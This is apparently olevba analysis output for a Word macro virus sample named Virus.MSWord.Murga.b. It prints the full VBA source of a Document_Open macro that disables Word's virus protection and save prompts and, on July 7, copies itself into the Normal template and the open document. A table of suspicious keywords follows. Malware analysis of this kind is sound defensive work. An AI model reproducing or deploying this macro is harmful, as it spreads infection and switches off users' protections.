olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Murga.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO nofrx.cls 
in file: Virus.MSWord.Murga.b - OLE stream: 'Macros/VBA/nofrx'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
' NofrX.a by ImPUls3 ´99
' Special greetinz goes to Genesis
On Error GoTo kraj
 
With Options
    
    .VirusProtection = False
    .SaveNormalPrompt = False
    .ConfirmConversions = False
    
End With

If (Month(Now) = 7) And (Day(Now) = 7) Then

    ActiveDocument.VBProject.VBComponents.Item("nofrx").Export ("c:\sys.sys")
    NormalTemplate.VBProject.VBComponents.Import ("c:\sys.sys")
    
    If NormalTemplate.VBProject.VBComponents.Item("nofrx").Name <> "nofrx" Then
    NormalTemplate.VBProject.VBComponents.Import ("c:\sys.sys")
    End If
    If ActiveDocument.VBProject.VBComponents.Item("nofrx").Name <> "nofrx" Then
    ActiveDocument.VBProject.VBComponents.Import ("c:\sys.sys")
    End If
    MsgBox ("Danas je rodjendan Murga-drotu!!!! Ohoooooo!"), vbInformation

End If
kraj:
End Sub






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

